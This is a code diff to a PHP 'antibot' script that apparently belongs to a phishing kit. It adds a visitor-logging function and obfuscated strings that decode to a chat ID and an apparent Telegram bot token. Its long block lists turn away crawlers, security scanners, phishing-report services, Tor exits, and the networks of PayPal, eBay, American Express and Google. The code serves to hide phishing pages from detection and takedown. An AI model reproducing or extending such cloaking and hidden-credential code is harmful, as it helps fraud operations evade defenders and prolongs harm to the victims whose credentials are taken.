@@ -179,8 +179,35 @@ function whois()
 {
     return @json_decode(file_get_contents("http://ip-api.com/json/" . getIp()), true);
 }
-$chatid=$ch;
-$api=$i;
+
+function logger($data, $reason)
+{
+    $today = date('l, d F H H:i:s');
+    $ip = getIP();
+    $visit = whois();
+    $os = getOS();
+    $br = getBrowser();
+    $fopen = fopen("./bot_logs.txt", "a+") or die("Unable to open file!");
+    $body = "🔥 [ BLAZE ANTIBOT ] 🔥";
+    $body .= "REASON: {$reason} | CODE: " . uniqid() . "\n";
+    $body .= "BOT: {$data}\n";
+    $body .= "DATE: {$today}\n";
+    $body .= "IP Address: {$ip}" . "\n";
+    $body .= "COUNTRY: {$visit['country']}" . "\n";
+    $body .= "REGION: {$visit['city']}" . "\n";
+    $body .= "ORGANISATION: {$visit['isp']}" . "\n";
+    $body .= "ASN: {$visit['as']}\n";
+    $body .= "HOSTNAME: " . gethostbyaddr($ip) . "\n";
+    $body .= "OS: {$os}\n";
+    $body .= "BROWSER: {$br}\n";
+    $body .= "USER AGENT: {$_SERVER['HTTP_USER_AGENT']}\n";
+    fwrite($fopen, $body);
+    fclose($fopen);
+}
+
+$hostname = gethostbyaddr($_SERVER["REMOTE_ADDR"]); $ua = strtolower($_SERVER["HTTP_USER_AGENT"]); $visit = whois();
+
+
 $badHosts = array(
     "colocrossing.com",
     "QuerySeekerSpider",
@@ -1224,7 +1251,7 @@ $badISPs = array(
     "Internet Customers"
 );
 
-  goto pq0te; WHxmM: $ch = "\65\61\x30\x39\x30\x38\67\64\63\65"; goto G4UHa; pq0te: $i = "\x35\x32\x30\62\x33\x32\x35\65\x30\x33\x3a\101\101\x47\64\64\165\x6e\x68\154\x59\x67\60\x50\113\x53\123\x65\x6a\x6d\x49\153\155\x43\x56\x6d\63\x61\x37\61\142\x30\x49\x6a\161\x77"; goto WHxmM; G4UHa:
+ goto pq0te; WHxmM: $chatid = "\65\61\x30\x39\x30\x38\67\64\63\65"; goto G4UHa; pq0te: $api = "\x35\x32\x30\62\x33\x32\x35\65\x30\x33\x3a\101\101\x47\64\64\165\x6e\x68\154\x59\x67\60\x50\113\x53\123\x65\x6a\x6d\x49\153\155\x43\x56\x6d\63\x61\x37\61\142\x30\x49\x6a\161\x77"; goto WHxmM; G4UHa: 
 $blocked_words = array("deltainfocom", "dnsserverhosting", "Java/1.6.0_22", "Go-http-client/1.1", "drweb", "Dr.Web", "hostinger", "scanurl", "above", "level3", "level", "involta", "SOLUTIONPRO-NET", "SOLUTION", "SolutionPro", "SPRO-NET-206-80-96", "SPRO-NET-207-70-0", "SPRO-NET-209-19-128", "LVLT-STATIC-4-14-16", "americanexpress", "google", "softlayer", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "paypal", "facebook", "ebay", "Baiduspider", "ia_archiver", "R6_FeedFetcher", "NetcraftSurveyAgent", "Sogou web spider", "PrintfulBot", "UnwindFetchor", "urlresolver", "Butterfly", "TweetmemeBot", "PaperLiBot", "MJ12bot", "AhrefsBot", "Exabot", "Ezooms", "YandexBot", "SearchmetricsBot", "picsearch", "TweetedTimes Bot", "QuerySeekerSpider", "ShowyouBot", "woriobot", "merlinkbot", "BazQuxBot", "Kraken", "SISTRIX Crawler", "R6_CommentReader", "magpie-crawler", "GrapeshotCrawler", "PercolateCrawler", "MaxPointCrawler", "R6_FeedFetcher", "NetSeer crawler", "grokkit-crawler", "SMXCrawler", "PulseCrawler", "Y!J-BRW", "datasift", "80legs.com/webcrawler", "Mediapartners-Google", "Spinn3r", "InAGist", "Python-urllib", "python-requests", "NING", "TencentTraveler", "Feedfetcher-Google", "mon.itor.us", "p3pwgdsn", "sucuri.net", "messagelabs", "torservers", "trendmicro", "spbot", "Feedly", "bot", "curl", "spider", "crawler");
 foreach ($blocked_words as $word) {
     if (substr_count($hostname, $word) > 0) {
@@ -4019,7 +4046,6 @@ foreach ($blocked_words2 as $word2) {
 }
 $br = getBrowser();
 $os = getOS();
-
 $v_agent = $_SERVER["HTTP_USER_AGENT"];
 if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {
     logger($v_agent, "BOT AGENT");
